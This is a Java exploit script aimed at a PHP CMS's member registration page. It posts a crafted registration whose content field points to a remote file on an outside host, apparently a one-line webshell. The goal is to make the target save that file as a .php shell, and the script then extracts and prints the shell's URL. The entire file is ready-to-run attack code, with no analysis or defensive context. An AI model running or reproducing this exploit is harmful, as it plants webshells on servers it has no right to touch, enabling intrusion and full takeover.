import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {

    public static void main(String[] args) {

        String result;
        String shell;

        String url=args[0]+"/index.php?m=member&c=index&a=register&siteid=1";
        String payLoad = "siteid=1&modelid=11&username=132acasd423&password=adcdfaseft&email=1424afac4123@126.com&info[content]=<img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg>&dosubmit=1&protocol=";

        result = Post(url, payLoad);
        shell = Macth(result);
        System.out.println(shell);
    }

    public static String Post(String url, String param) {

        OutputStreamWriter out = null;
        BufferedReader in = null;
        String result = "";
        try {

            URL realUrl = new URL(url);
            URLConnection connection = realUrl.openConnection();

            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
            connection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            connection.setRequestProperty("Accept-Encoding", "UTF-8");
            connection.setRequestProperty("Connection", "close");
            connection.setRequestProperty("Accept-Charset", "UTF-8");
            connection.setRequestProperty("contentType", "UTF-8");
            connection.setRequestProperty("Upgrade-Insecure-Requests", "1");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded,charset=UTF-8");
            connection.setRequestProperty("Content-Length", "230");
            connection.setRequestProperty("Referer", "realUrl");

            connection.setDoInput(true);
            connection.setDoOutput(true);

            out = new OutputStreamWriter(connection.getOutputStream(), "UTF-8");
            out.write(param);
            out.flush();

            in = new BufferedReader(
                    new InputStreamReader(connection.getInputStream(), "UTF-8"));
            String line;
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception e) {
            System.out.println("发送 POST 请求出现异常！" + e);
            e.printStackTrace();
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }

        if (result.isEmpty()) {
            return "不存在改漏洞";
        }

        return result;
    }


    public static String Macth(String string) {
        String strPattern = "src=(.*?)&";
        Pattern pattern = Pattern.compile(strPattern);
        Matcher matcher = pattern.matcher(string);
        if (matcher.find()) {
            return matcher.group(1);
        } else {
            System.out.println(string);
            return "上传失败";
        }
    }
}